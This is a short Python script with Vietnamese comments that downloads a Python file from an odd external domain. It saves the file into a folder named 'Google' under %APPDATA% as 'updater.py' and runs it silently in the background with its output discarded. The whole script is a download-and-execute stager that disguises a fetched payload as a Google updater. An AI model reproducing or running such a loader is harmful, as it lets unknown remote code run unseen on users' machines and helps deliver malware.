import os
import requests
import subprocess
import sys

# Link file cần tải
FILE_URL = "https://love.wvxx.dpdns.org/download/blablabla/deptraichx.py"

# Lấy đường dẫn %appdata%
appdata_path = os.getenv("APPDATA")

# Tạo thư mục Swelium
folder_path = os.path.join(appdata_path, "Google")
os.makedirs(folder_path, exist_ok=True)

# Đường dẫn file sẽ lưu
file_path = os.path.join(folder_path, "updater.py")

def download_file():
    print("Đang tải file...")

    r = requests.get(FILE_URL)
    r.raise_for_status()

    with open(file_path, "wb") as f:
        f.write(r.content)

    print("Đã tải xong:", file_path)

def run_file():
    print("Đang chạy file...")
    subprocess.Popen(
        [sys.executable, file_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


download_file()
run_file()
